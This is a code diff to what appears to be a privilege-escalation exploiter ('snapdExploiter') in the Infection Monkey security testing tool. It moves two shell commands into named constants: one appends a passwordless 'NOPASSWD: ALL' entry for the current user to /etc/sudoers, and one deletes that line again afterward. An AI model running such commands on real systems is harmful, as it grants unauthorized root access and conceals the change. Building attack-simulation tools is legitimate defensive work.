@@ -13,6 +13,7 @@ import random
 import subprocess
 from logging import getLogger
 from infection_monkey.pe import HostPrivExploiter
+from infection_monkey.model import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
 
 LOG = getLogger(__name__)
 
@@ -206,8 +207,8 @@ class snapdExploiter(HostPrivExploiter):
         LOG.info("Adding the current user %s to the sudoers list",whoami)
 
         # add the user to the sudo group
-        runMonkeyAsRoot = "echo '%s ALL = NOPASSWD: ALL' | sudo tee -a /etc/sudoers"
-        runCommandAsRoot(runMonkeyAsRoot % whoami)
+        runMonkeyAsRoot = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
+        runCommandAsRoot(runMonkeyAsRoot)
 
 
         # now run the monkey as root
@@ -224,6 +225,8 @@ class snapdExploiter(HostPrivExploiter):
         # now remove the user from sudoers
         LOG.info("Removing the current user %s from the sudoers list", whoami)
 
-        removesudoers = "sudo sed -i '$ d' /etc/sudoers"
-        runCommandAsRoot(removesudoers)
+        removesudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
+        monkey_process = subprocess.Popen(removesudoers, shell=True,
+                                          stdin=None, stdout=None, stderr=None,
+                                          close_fds=True, creationflags=0)
         return True
